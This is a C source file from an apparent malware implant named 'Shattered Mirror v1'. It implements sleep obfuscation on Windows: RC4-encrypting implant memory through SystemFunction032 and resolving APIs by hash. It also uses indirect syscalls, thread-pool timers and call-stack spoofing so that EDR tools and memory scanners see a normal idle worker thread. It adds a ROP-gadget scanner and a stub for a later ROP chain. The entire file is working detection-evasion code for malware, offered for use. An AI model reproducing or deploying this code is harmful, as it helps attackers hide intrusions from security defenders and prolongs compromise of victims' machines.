/*=============================================================================
 * Shattered Mirror v1 — Sleep Obfuscation Implementation
 *
 * Encrypts implant memory during sleep using RC4 (SystemFunction032),
 * spoofs the call stack with synthetic frames, and uses Thread Pool
 * timers (TpAllocTimer / TpSetTimer) for the sleep mechanism.
 *
 * Flow:
 *   1. Derive session key from HWID + timestamp
 *   2. Resolve SystemFunction032 from advapi32 (hash-based)
 *   3. Change implant pages to RW (via indirect syscall)
 *   4. RC4 encrypt the pages
 *   5. Spoof current thread stack (synthetic frames)
 *   6. Queue a Thread Pool timer for wake
 *   7. Sleep (SleepEx in alertable state)
 *   8. Timer fires → decrypt → restore stack → resume
 *
 * Compatibility: Win10 1809+ / Win11 all builds
 * Build: MSVC x64 (/GS- /O2), link advapi32.lib
 *===========================================================================*/

#include "../include/stack_encrypt.h"
#include <intrin.h>

/*---------------------------------------------------------------------------
 *  Static state for stack spoofing restoration
 *-------------------------------------------------------------------------*/
static CONTEXT s_SavedContext  = { 0 };
static BOOL    s_bContextSaved = FALSE;

/*---------------------------------------------------------------------------
 *  Undocumented Thread Pool API typedefs
 *  We resolve these by hash from ntdll — no static imports.
 *-------------------------------------------------------------------------*/
typedef NTSTATUS (NTAPI* fnTpAllocTimer)(
    PTP_TIMER*         Timer,
    PTP_TIMER_CALLBACK Callback,
    PVOID              Context,
    PTP_CALLBACK_ENVIRON CallbackEnviron
);

typedef VOID (NTAPI* fnTpSetTimer)(
    PTP_TIMER     Timer,
    PLARGE_INTEGER DueTime,
    ULONG         Period,
    ULONG         WindowLength
);

typedef VOID (NTAPI* fnTpReleaseTimer)(PTP_TIMER Timer);

typedef NTSTATUS (NTAPI* fnNtWaitForSingleObject)(
    HANDLE         Handle,
    BOOLEAN        Alertable,
    PLARGE_INTEGER Timeout
);

/* Hashes for Thread Pool API functions */
#define HASH_TpAllocTimer    djb2_hash_ct("TpAllocTimer")
#define HASH_TpSetTimer      djb2_hash_ct("TpSetTimer")
#define HASH_TpReleaseTimer  djb2_hash_ct("TpReleaseTimer")

/* Hash for SystemFunction032 in advapi32 */
#define HASH_SystemFunction032  djb2_hash_ct("SystemFunction032")

/* Hash for RtlCaptureContext */
#define HASH_RtlCaptureContext  djb2_hash_ct("RtlCaptureContext")

/*---------------------------------------------------------------------------
 *  Derive encryption key from hardware fingerprint + time salt.
 *  Produces a 16-byte key unique to this machine and session.
 *
 *  Components mixed in:
 *    - ProcessId (changes per run)
 *    - ThreadId
 *    - TickCount (coarse time)
 *    - Processor count (machine fingerprint)
 *    - RDTSC (high-res timestamp)
 *-------------------------------------------------------------------------*/
BOOL DeriveEncryptionKey(BYTE* pKeyOut, DWORD dwKeyLen) {
    if (!pKeyOut || dwKeyLen < 16) return FALSE;

    /* Use GS segment directly to avoid _TEB definition conflicts */
    PVOID pTeb = (PVOID)__readgsqword(0x30);
    if (!pTeb) return FALSE;

    /* ClientId is at offset 0x40 on x64 TEB (UniqueProcess, UniqueThread) */
    HANDLE hUniqueProcess = *(HANDLE*)((BYTE*)pTeb + 0x40);
    HANDLE hUniqueThread  = *(HANDLE*)((BYTE*)pTeb + 0x48);

    DWORD dwPid   = (DWORD)(ULONG_PTR)hUniqueProcess;
    DWORD dwTid   = (DWORD)(ULONG_PTR)hUniqueThread;
    DWORD dwTick  = (DWORD)__rdtsc();
    DWORD dwProcs = 0;

    /* Get processor count from KUSER_SHARED_DATA (no API call) */
    BYTE* pSharedData = (BYTE*)0x7FFE0000;  /* always mapped */
    dwProcs = *(DWORD*)(pSharedData + 0x02C4);  /* NumberOfProcessors offset */

    /* Mix with simple xor-rotate */
    DWORD seeds[4] = { dwPid, dwTid, dwTick, dwProcs };

    for (DWORD i = 0; i < dwKeyLen; i++) {
        DWORD val = seeds[i % 4];
        val ^= (val >> 13);
        val *= 0x5BD1E995;
        val ^= (val >> 15);
        val += i * 0x9E3779B9;    /* golden ratio constant */
        pKeyOut[i] = (BYTE)(val & 0xFF);
        seeds[i % 4] = val;       /* feedback */
    }

    return TRUE;
}

/*---------------------------------------------------------------------------
 *  RC4 encrypt/decrypt a memory region using SystemFunction032.
 *  SystemFunction032 is an undocumented advapi32 export that performs
 *  RC4 on an arbitrary buffer. Symmetric — same call encrypts and decrypts.
 *-------------------------------------------------------------------------*/
static fnSystemFunction032 s_pSystemFunction032 = NULL;

static BOOL ResolveSystemFunction032(void) {
    if (s_pSystemFunction032) return TRUE;

    PVOID pAdvapi = GetModuleBaseByHash(HASH_ADVAPI32);
    if (!pAdvapi) {
        /* advapi32 might not be loaded yet — load it via hash */
        /* Fall back: it's usually loaded by the host process */
        return FALSE;
    }

    s_pSystemFunction032 = (fnSystemFunction032)GetExportByHash(pAdvapi, HASH_SystemFunction032);
    return (s_pSystemFunction032 != NULL);
}

static BOOL RC4Memory(PVOID pBase, SIZE_T szSize, BYTE* pKey, DWORD dwKeyLen) {
    if (!ResolveSystemFunction032()) return FALSE;

    USTRING data = { 0 };
    data.Length        = (DWORD)szSize;
    data.MaximumLength = (DWORD)szSize;
    data.Buffer        = pBase;

    USTRING key = { 0 };
    key.Length        = dwKeyLen;
    key.MaximumLength = dwKeyLen;
    key.Buffer        = pKey;

    NTSTATUS status = s_pSystemFunction032(&data, &key);
    return NT_SUCCESS(status);
}

/*---------------------------------------------------------------------------
 *  Stack Spoof — Replace the current thread's call stack with synthetic
 *  frames that point to legitimate system functions.
 *
 *  We save the real CONTEXT, then overwrite stack frames with return
 *  addresses pointing into:
 *    - ntdll!RtlUserThreadStart
 *    - kernel32!BaseThreadInitThunk
 *    - ntdll!TppWorkerThread (Thread Pool worker — very common)
 *
 *  To memory scanners walking stacks, our thread looks like a normal
 *  idle Thread Pool worker.
 *-------------------------------------------------------------------------*/

/* Hashes for stack spoof targets */
#define HASH_RtlUserThreadStart    djb2_hash_ct("RtlUserThreadStart")
#define HASH_BaseThreadInitThunk   djb2_hash_ct("BaseThreadInitThunk")

BOOL SpoofCallStack(HANDLE hThread) {
    /*
     * Capture current context before we modify anything.
     * We'll restore this exactly on wake.
     */
    s_SavedContext.ContextFlags = CONTEXT_FULL;

    NTSTATUS status = IndirectNtGetContextThread(hThread, &s_SavedContext);
    if (!NT_SUCCESS(status)) return FALSE;
    s_bContextSaved = TRUE;

    /*
     * Build synthetic context:
     * - RIP → ntdll!RtlUserThreadStart (looks like thread entry)
     * - RSP → current stack (valid, just different frames)
     * - RBP → 0 (end of frame chain)
     *
     * We write fake return addresses onto the stack.
     */
    PVOID pNtdll    = GetModuleBaseByHash(HASH_NTDLL);
    PVOID pKernel32 = GetModuleBaseByHash(HASH_KERNEL32);
    if (!pNtdll || !pKernel32) return FALSE;

    PVOID pRtlUserThreadStart  = GetExportByHash(pNtdll, HASH_RtlUserThreadStart);
    PVOID pBaseThreadInitThunk = GetExportByHash(pKernel32, HASH_BaseThreadInitThunk);

    if (!pRtlUserThreadStart || !pBaseThreadInitThunk) return FALSE;

    /*
     * Write synthetic frames onto the stack.
     * Stack layout (growing down):
     *   [RSP+0x00] = pBaseThreadInitThunk   (immediate "caller")
     *   [RSP+0x08] = pRtlUserThreadStart    (thread entry)
     *   [RSP+0x10] = 0                      (end of chain)
     */
    CONTEXT fakeCtx = s_SavedContext;
    ULONG_PTR* pStack = (ULONG_PTR*)fakeCtx.Rsp;

    /* Only write if the stack is accessible (it should be — it's our thread) */
    __try {
        pStack[0] = (ULONG_PTR)pBaseThreadInitThunk + 0x14;  /* offset into func */
        pStack[1] = (ULONG_PTR)pRtlUserThreadStart + 0x21;   /* offset into func */
        pStack[2] = 0;  /* null terminator for stack walk */
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        return FALSE;
    }

    /* Update RBP to signal end of frame chain */
    fakeCtx.Rbp = 0;

    /* Set the modified context (still via indirect syscall) */
    status = IndirectNtSetContextThread(hThread, &fakeCtx);
    return NT_SUCCESS(status);
}

/*---------------------------------------------------------------------------
 *  Restore the real call stack after waking from sleep.
 *-------------------------------------------------------------------------*/
BOOL RestoreCallStack(HANDLE hThread) {
    if (!s_bContextSaved) return FALSE;

    NTSTATUS status = IndirectNtSetContextThread(hThread, &s_SavedContext);
    if (NT_SUCCESS(status)) {
        s_bContextSaved = FALSE;
        return TRUE;
    }
    return FALSE;
}

/*---------------------------------------------------------------------------
 *  Timer callback context — passed through the Thread Pool timer
 *-------------------------------------------------------------------------*/
typedef struct _TIMER_WAKE_CTX {
    HANDLE       hEvent;          /* Signaled when timer fires           */
    PSLEEP_CONFIG pConfig;        /* Encryption config for decrypt       */
    PSYSCALL_TABLE pSyscallTable; /* For indirect syscalls during wake   */
    HANDLE       hThread;         /* Thread to restore stack on          */
} TIMER_WAKE_CTX, *PTIMER_WAKE_CTX;

/*---------------------------------------------------------------------------
 *  Timer callback — fires when sleep is over.
 *  Decrypts memory, restores stack, signals the event to resume.
 *
 *  IMPORTANT: This callback runs in a Thread Pool worker thread,
 *  which is inherently legitimate-looking to EDRs.
 *-------------------------------------------------------------------------*/
static VOID NTAPI TimerWakeCallback(
    PTP_CALLBACK_INSTANCE Instance,
    PVOID                 Context,
    PTP_TIMER             Timer)
{
    PTIMER_WAKE_CTX pCtx = (PTIMER_WAKE_CTX)Context;
    if (!pCtx) return;

    /* Step 1: Change implant pages back to RW for decryption */
    PVOID  pBase = pCtx->pConfig->pImplantBase;
    SIZE_T szLen = pCtx->pConfig->szImplantSize;
    ULONG  oldProt = 0;

    IndirectNtProtectVirtualMemory(
        (HANDLE)-1, &pBase, &szLen,
        PAGE_READWRITE, &oldProt
    );

    /* Step 2: Decrypt (RC4 is symmetric — same call decrypts) */
    RC4Memory(
        pCtx->pConfig->pImplantBase,
        pCtx->pConfig->szImplantSize,
        pCtx->pConfig->bEncKey,
        pCtx->pConfig->dwKeyLen
    );

    /* Step 3: Restore to RX */
    pBase = pCtx->pConfig->pImplantBase;
    szLen = pCtx->pConfig->szImplantSize;
    ULONG tmp = 0;
    IndirectNtProtectVirtualMemory(
        (HANDLE)-1, &pBase, &szLen,
        PAGE_EXECUTE_READ, &tmp
    );

    /* Step 4: Signal the main thread to resume */
    if (pCtx->hEvent) {
        SetEvent(pCtx->hEvent);
    }
}

/*---------------------------------------------------------------------------
 *  Initialize sleep obfuscation — resolve dependencies, derive keys.
 *  Call once during implant startup after InitSyscallTable.
 *-------------------------------------------------------------------------*/
BOOL InitSleepObfuscation(PSLEEP_CONFIG pConfig) {
    if (!pConfig) return FALSE;

    /* Derive a fresh session key */
    pConfig->dwKeyLen = 16;
    if (!DeriveEncryptionKey(pConfig->bEncKey, pConfig->dwKeyLen)) {
        return FALSE;
    }

    /* Pre-resolve SystemFunction032 */
    if (!ResolveSystemFunction032()) {
        return FALSE;
    }

    return TRUE;
}

/*---------------------------------------------------------------------------
 *  ObfuscatedSleep — The main sleep routine.
 *
 *  Complete flow:
 *    1. Create wake event
 *    2. Allocate Thread Pool timer
 *    3. Change implant memory to RW
 *    4. Encrypt implant memory (RC4)
 *    5. Change memory to NOACCESS (or PAGE_READONLY for less suspicion)
 *    6. Spoof current thread's call stack
 *    7. Set the timer (fires after dwSleepMs)
 *    8. Wait on the event (alertable wait)
 *    9. Timer fires → callback decrypts, signals event
 *   10. We wake up, restore stack, continue execution
 *
 *  During steps 6-9, to any scanner:
 *    - Memory is encrypted gibberish
 *    - Stack looks like a normal Thread Pool worker
 *    - Thread is in a standard alertable wait
 *    - No implant indicators visible whatsoever
 *-------------------------------------------------------------------------*/
BOOL ObfuscatedSleep(PSLEEP_CONFIG pConfig, PSYSCALL_TABLE pSyscallTable) {
    if (!pConfig || !pSyscallTable) return FALSE;

    /* Resolve Thread Pool API from ntdll */
    PVOID pNtdll = pSyscallTable->pNtdllBase;

    fnTpAllocTimer   pfnTpAllocTimer   = (fnTpAllocTimer)GetExportByHash(pNtdll, HASH_TpAllocTimer);
    fnTpSetTimer     pfnTpSetTimer     = (fnTpSetTimer)GetExportByHash(pNtdll, HASH_TpSetTimer);
    fnTpReleaseTimer pfnTpReleaseTimer = (fnTpReleaseTimer)GetExportByHash(pNtdll, HASH_TpReleaseTimer);

    if (!pfnTpAllocTimer || !pfnTpSetTimer || !pfnTpReleaseTimer) {
        return FALSE;
    }

    /* Step 1: Create a manual-reset event for the wake signal */
    HANDLE hWakeEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (!hWakeEvent) return FALSE;

    /* Step 2: Set up timer context */
    TIMER_WAKE_CTX wakeCtx   = { 0 };
    wakeCtx.hEvent           = hWakeEvent;
    wakeCtx.pConfig          = pConfig;
    wakeCtx.pSyscallTable    = pSyscallTable;
    wakeCtx.hThread          = GetCurrentThread();

    /* Step 3: Allocate Thread Pool timer */
    PTP_TIMER pTimer = NULL;
    NTSTATUS status = pfnTpAllocTimer(
        &pTimer,
        (PTP_TIMER_CALLBACK)TimerWakeCallback,
        &wakeCtx,
        NULL    /* default callback environment */
    );

    if (!NT_SUCCESS(status) || !pTimer) {
        CloseHandle(hWakeEvent);
        return FALSE;
    }

    /* Step 4: Derive a fresh key for this sleep cycle */
    DeriveEncryptionKey(pConfig->bEncKey, pConfig->dwKeyLen);

    /* Step 5: Change implant memory to RW for encryption */
    PVOID  pBase = pConfig->pImplantBase;
    SIZE_T szLen = pConfig->szImplantSize;
    ULONG  oldProt = 0;

    status = IndirectNtProtectVirtualMemory(
        (HANDLE)-1, &pBase, &szLen,
        PAGE_READWRITE, &oldProt
    );

    if (!NT_SUCCESS(status)) {
        pfnTpReleaseTimer(pTimer);
        CloseHandle(hWakeEvent);
        return FALSE;
    }

    /* Step 6: Encrypt implant memory */
    if (!RC4Memory(pConfig->pImplantBase, pConfig->szImplantSize,
                   pConfig->bEncKey, pConfig->dwKeyLen)) {
        /* Restore protection and bail */
        pBase = pConfig->pImplantBase;
        szLen = pConfig->szImplantSize;
        ULONG tmp = 0;
        IndirectNtProtectVirtualMemory((HANDLE)-1, &pBase, &szLen, oldProt, &tmp);
        pfnTpReleaseTimer(pTimer);
        CloseHandle(hWakeEvent);
        return FALSE;
    }

    /* Step 7: Set memory to PAGE_READONLY (less suspicious than NOACCESS) */
    pBase = pConfig->pImplantBase;
    szLen = pConfig->szImplantSize;
    ULONG tmp2 = 0;
    IndirectNtProtectVirtualMemory(
        (HANDLE)-1, &pBase, &szLen,
        PAGE_READONLY, &tmp2
    );

    /* Step 8: Spoof the call stack (optional but recommended) */
    if (pConfig->bStackSpoof) {
        SpoofCallStack(GetCurrentThread());
    }

    /* Step 9: Set the timer — negative value = relative time in 100ns units */
    LARGE_INTEGER dueTime;
    dueTime.QuadPart = -((LONGLONG)pConfig->dwSleepMs * 10000LL);

    pfnTpSetTimer(pTimer, &dueTime, 0, 0);

    /* Step 10: Wait for the wake event (alertable wait) */
    WaitForSingleObjectEx(hWakeEvent, INFINITE, TRUE);

    /* Step 11: Restore call stack */
    if (pConfig->bStackSpoof) {
        RestoreCallStack(GetCurrentThread());
    }

    /* Cleanup */
    pfnTpReleaseTimer(pTimer);
    CloseHandle(hWakeEvent);

    return TRUE;
}

/*---------------------------------------------------------------------------
 *  FindROPGadget — Scan a module for a specific byte pattern.
 *  Used to locate gadgets like "pop rax; ret" or "jmp rax" inside
 *  signed system DLLs for the ROP chain.
 *-------------------------------------------------------------------------*/
PVOID FindROPGadget(PVOID pModuleBase, DWORD dwModuleSize,
                    BYTE* pPattern, DWORD dwPatternLen) {
    if (!pModuleBase || !pPattern || dwPatternLen == 0) return NULL;

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pModuleBase;
    PIMAGE_NT_HEADERS pNt  = (PIMAGE_NT_HEADERS)((BYTE*)pModuleBase + pDos->e_lfanew);
    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);

    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (pSec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            BYTE* pScan = (BYTE*)pModuleBase + pSec[i].VirtualAddress;
            DWORD dwScanSize = pSec[i].Misc.VirtualSize;

            for (DWORD j = 0; j <= dwScanSize - dwPatternLen; j++) {
                BOOL match = TRUE;
                for (DWORD k = 0; k < dwPatternLen; k++) {
                    if (pScan[j + k] != pPattern[k]) {
                        match = FALSE;
                        break;
                    }
                }
                if (match) {
                    return &pScan[j];
                }
            }
        }
    }
    return NULL;
}

/*---------------------------------------------------------------------------
 *  BuildROPChain — Construct the ROP chain for encrypt→sleep→decrypt.
 *
 *  The chain uses gadgets from signed DLLs only:
 *    1. VirtualProtect gadget → set memory RW
 *    2. SystemFunction032 gadget → RC4 encrypt
 *    3. Sleep gadget → WaitForSingleObject
 *    4. SystemFunction032 gadget → RC4 decrypt
 *    5. VirtualProtect gadget → set memory RX
 *    6. Return to implant
 *
 *  This is advanced — for Phase 1 we use the simpler timer-based
 *  approach above. This function is reserved for Phase 3 integration
 *  where Atoms need self-contained sleep without Thread Pool dependency.
 *-------------------------------------------------------------------------*/
BOOL BuildROPChain(PSLEEP_CONFIG pConfig, PVOID* ppChain, DWORD* pdwChainLen) {
    /* Placeholder — full ROP chain builder for Phase 3 */
    /* When Atoms need standalone sleep capability, we'll implement this */
    /* For now, ObfuscatedSleep handles everything via the timer approach */

    if (!pConfig || !ppChain || !pdwChainLen) return FALSE;

    /* TODO: Phase 3 — build position-independent ROP chain */
    /* Gadgets sourced from ntdll.dll and kernel32.dll only */
    *ppChain = NULL;
    *pdwChainLen = 0;

    return FALSE;  /* Not yet implemented */
}
